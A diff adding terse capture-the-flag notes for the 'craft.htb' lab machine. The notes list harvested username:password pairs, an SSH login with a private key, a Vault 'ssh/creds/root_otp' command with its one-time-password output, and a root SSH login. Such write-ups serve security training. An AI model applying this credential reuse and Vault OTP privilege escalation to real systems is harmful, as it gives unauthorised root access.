@@ -1,0 +1,25 @@
+
+dinesh:4aUh0A8PbVJxgd
+ebachman:llJ77D8QFkLPQB
+gilfoyle:ZEU3N8WNM2rh4T
+
+ssh -i id_rsa gilfoyle@craft.htb
+
+# inside the box:
+$ vault write ssh/creds/root_otp ip=10.10.10.110
+Key                Value
+---                -----
+lease_id           ssh/creds/root_otp/977f93a2-4450-15aa-0fc1-30f8fb7682a4
+lease_duration     768h
+lease_renewable    false
+ip                 10.10.10.110
+key                6cbecb16-98de-2a1e-a324-004e25c15020
+key_type           otp
+port               22
+username           root
+
+
+$ ssh root@10.10.10.110
+# copy the OTP (key)
+
+root@craft:~# WE GOT A ROOT SHELL
